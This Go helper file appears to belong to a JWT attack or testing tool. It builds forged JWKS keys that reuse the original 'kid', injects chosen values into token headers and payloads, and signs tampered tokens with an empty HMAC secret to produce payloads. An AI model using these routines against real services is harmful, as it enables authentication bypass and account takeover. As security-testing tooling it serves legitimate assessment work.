package helpers

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"

	"log"

	"github.com/golang-jwt/jwt"
)

func NewRSAKeyPair() ([]uint8, []uint8) {

	// Generate RSA key.
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	// Extract public component.
	pub := key.Public()

	// Encode private key to PKCS#1 ASN.1 PEM.
	keyPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		},
	)

	// Encode public key to PKCS#1 ASN.1 PEM.
	pubPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
		},
	)

	return keyPEM, pubPEM
}

func PubKeyModExpPrivateKey() (rsa.PublicKey, []uint8, *rsa.PrivateKey) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	keyPEM := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(key),
		},
	)
	return key.PublicKey, keyPEM, key
}

func GenerateJWKS(decodedToken *jwt.Token) (map[string]interface{}, []uint8, *rsa.PrivateKey) {
	originalHeader := decodedToken.Header
	publicKey, privateKey, key := PubKeyModExpPrivateKey()
	modifiedJWKS := make(map[string]interface{}, 0)

	exp := make([]byte, 4)
	binary.BigEndian.PutUint32(exp, uint32(publicKey.E))
	exp = exp[1:]
	expB64 := jwt.EncodeSegment(exp)

	modifiedJWKS["kty"] = "RSA"
	if originalHeader["kid"] != nil {
		modifiedJWKS["kid"] = originalHeader["kid"]
	}
	modifiedJWKS["use"] = "sig"
	modifiedJWKS["n"] = jwt.EncodeSegment(publicKey.N.Bytes())
	modifiedJWKS["e"] = expB64

	return modifiedJWKS, privateKey, key
}

// modifications -> list of key:value pairs
func InjectSegment(originalSegment map[string]interface{}, modifications []map[string]interface{}) string {
	modifiedSegment := make(map[string]interface{})

	// Copy originalSegment into modifiedSegment
	for key := range originalSegment {
		modifiedSegment[key] = originalSegment[key]
	}

	// there can be multiple modificiations for a single token (e.g: modifying both the "alg", and "typ" parameters in the same token)
	for _, mod := range modifications {
		// each modification is a key:value pair --> if the key already exists, this will overwrite the value with the modified value
		for modKey, modVal := range mod {
			modifiedSegment[modKey] = modVal
		}
	}

	// Jsonify and b64 encode
	modifiedJSON, err := json.Marshal(modifiedSegment)
	if err != nil {
		log.Println(err)
	}
	modifiedB64 := jwt.EncodeSegment(modifiedJSON)

	return modifiedB64
}

func InjectValues(originalSegment map[string]interface{}, key string, variations []string) []string {
	allModifications := make([]string, 0)
	for _, mod := range variations {
		modifications := []map[string]interface{}{{key: mod}}
		modifiedB64 := InjectSegment(originalSegment, modifications)
		allModifications = append(allModifications, modifiedB64)
	}
	return allModifications
}

func SignBlankPassword(modifiedSegments []string, segmentB64 string, segmentLocation string) []string {
	all := make([]string, 0)
	key := []byte("")

	for _, modifiedB64 := range modifiedSegments {

		var signingString string
		if segmentLocation == "header" {
			signingString = segmentB64 + "." + modifiedB64
		} else {
			signingString = modifiedB64 + "." + segmentB64
		}

		signature, err := jwt.SigningMethodHS256.Sign(signingString, key)
		if err != nil {
			log.Fatal(err)
		}
		all = append(all, signingString+"."+signature)

	}
	return all
}

func PrintAllFormatted(allPayloads map[string]string) {
	for _, val := range allPayloads {
		fmt.Println(val)

	}
}


